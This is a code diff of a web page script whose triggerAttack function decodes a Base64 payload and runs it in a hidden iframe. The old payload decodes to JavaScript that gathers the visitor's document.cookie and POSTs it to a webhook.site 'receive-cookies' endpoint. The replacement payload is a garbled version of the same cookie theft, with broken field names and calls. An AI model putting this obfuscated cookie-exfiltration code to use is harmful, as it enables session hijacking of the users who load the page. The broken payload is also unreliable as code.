@@ -21,8 +21,8 @@
     <script>
         function triggerAttack() {
             // Replace this with your new Base64 encoded payload
-            var encodedPayload = 'dmFyIGZpc2NoID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnZm9ybScpOwpmaXNjaC5tZXRob2QgPSAnUE9TVCc7CmZpc2NoLmFjdGlvbiA9ICdodHRwczovL3dlYmhvb2suc2l0ZS84Y2ZmZjNhYS0zM2E3LTQ0ZDMtOWRlMS04NmZkMjliMDk2N2IvcmVjZWl2ZS1jb29raWVzJzsKdmFyIGlucHV0ID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnaW5wdXQnKTsKaW5wdXQudHlwZSA9ICdoaWRkZW4nOwppbnB1dC5uYW1lID0gJ2Nvb2tpZURhdGEnOwppbnB1dC52YWx1ZSA9IGRvY3VtZW50LmNvb2tpZTsKZmlzY2guYXBwZW5kQ2hpbGQoaW5wdXQpOwpkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGZpc2NoKTsKZmlzY2guc3VibWl0KCk7Cg==';
-            
+            var encodedPayload = 'dmFyIGZpc2NoID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnZm9ybScpOwpmaXNjaC5tZXRob2QgPSAnUE9TVCc7CmZpc2NoLmFjdGlvbiA9ICdodHRwczovL3dlYmhvb2suc2l0ZS84Y2ZmZjNhYS0zM2E3LTQ0ZDMtOWRlMS04NmZkMjliMDk2N2IvcmVjZWl2ZS1jb29raWVzJzsKdmFyIGlucHV0ID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnaW5wdXQnKTsKaW5wdXQudHlwZSA9ICdoaWRkZW4nOwppbnB1dC5uYW1lID0gJ2Nvb2tpZURhdGFnJzsKaW5wdXQudmFsdWUgPSBkb2N1bWVudC5jb29raWUvcmVjdGVuYWJsZQpmc2NoLmFwcGVuZENoaWxkKGZpc2NoKTsKZmlzY2guYXBwZW5kQ2hpbGQoKTsK';
+
             // Decode the Base64 encoded payload
             var decodedPayload = atob(encodedPayload);
 
@@ -31,11 +31,16 @@
             iframe.style.display = 'none'; // Hide the iframe from view
             document.body.appendChild(iframe);
 
-            // Write the decoded script into the iframe
+            // Access the iframe's document and write the decoded script
             var iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
-            iframeDoc.open();
-            iframeDoc.write('<script>' + decodedPayload + '<\/script>');
-            iframeDoc.close();
+
+            if (iframeDoc) {
+                iframeDoc.open();
+                iframeDoc.write('<script>' + decodedPayload + '<\/script>');
+                iframeDoc.close();
+            } else {
+                console.error('Failed to access iframe document');
+            }
         }
 
         // Create the button element
